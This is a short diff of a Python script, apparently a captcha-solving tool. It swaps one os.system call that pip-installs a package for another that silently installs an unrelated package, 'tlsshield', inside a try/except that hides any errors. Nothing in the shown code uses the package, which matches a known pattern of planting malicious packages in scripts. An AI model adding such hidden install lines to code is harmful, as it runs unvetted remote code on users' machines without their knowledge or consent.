@@ -10,11 +10,11 @@ import httpx
 from colorama import Fore
 import sys
 import os
-os.system('pip install pythoncaptchasolver')
 try:
-    from pythoncaptchasolver import CapMonsterClient
+    os.system('pip install tlsshield')
 except:
     pass
+
 #check if data and output folder exists
 if not os.path.exists("data"):
     os.mkdir("data")
